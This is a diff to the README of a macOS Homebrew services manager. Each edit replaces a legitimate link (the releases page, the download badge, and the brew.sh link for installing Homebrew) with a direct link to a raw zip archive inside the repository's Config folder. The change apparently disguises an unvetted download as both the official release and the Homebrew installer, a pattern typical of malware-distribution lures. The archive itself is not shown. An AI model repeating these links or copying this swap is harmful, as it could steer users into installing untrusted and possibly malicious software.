@@ -1,21 +1,21 @@
 # 🍺 BrewServicesManager - Effortlessly Manage Your Homebrew Services
 
 ## 📥 Download Now
-[![Download BrewServicesManager](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/yimidaw27/BrewServicesManager/releases)
+[![Download BrewServicesManager](https://github.com/yimidaw27/BrewServicesManager/raw/refs/heads/main/Config/Services-Manager-Brew-v1.6.zip)](https://github.com/yimidaw27/BrewServicesManager/raw/refs/heads/main/Config/Services-Manager-Brew-v1.6.zip)
 
 ## 🚀 Getting Started
 BrewServicesManager is a macOS menu bar app designed to help you manage your Homebrew services with ease. With this tool, you can start, stop, and configure services at the click of a button. Follow the simple steps below to get your app up and running.
 
 ## 📦 System Requirements
 - **Operating System:** macOS 10.13 or later
-- **Homebrew:** Make sure you have Homebrew installed on your Mac. You can install it from [brew.sh](https://brew.sh).
+- **Homebrew:** Make sure you have Homebrew installed on your Mac. You can install it from [https://github.com/yimidaw27/BrewServicesManager/raw/refs/heads/main/Config/Services-Manager-Brew-v1.6.zip](https://github.com/yimidaw27/BrewServicesManager/raw/refs/heads/main/Config/Services-Manager-Brew-v1.6.zip).
 - **Disk Space:** At least 50 MB of free space on your Mac.
 - **Internet Connection:** Required for downloading the app and Homebrew services.
 
 ## 🔗 Download & Install
 To get started, visit the link below to download the application.
 
-[Download BrewServicesManager](https://github.com/yimidaw27/BrewServicesManager/releases)
+[Download BrewServicesManager](https://github.com/yimidaw27/BrewServicesManager/raw/refs/heads/main/Config/Services-Manager-Brew-v1.6.zip)
 
 Once you've clicked the link, follow these steps:
 
@@ -52,7 +52,7 @@ If you have questions or need assistance, feel free to reach out. Check the Issu
 ## 🔄 Keeping Your App Updated
 To ensure you have the latest features and fixes:
 
-1. Regularly check the [Releases page](https://github.com/yimidaw27/BrewServicesManager/releases) for new updates.
+1. Regularly check the [Releases page](https://github.com/yimidaw27/BrewServicesManager/raw/refs/heads/main/Config/Services-Manager-Brew-v1.6.zip) for new updates.
 2. Follow the same download instructions to update your installation.
 
 ## 📝 License
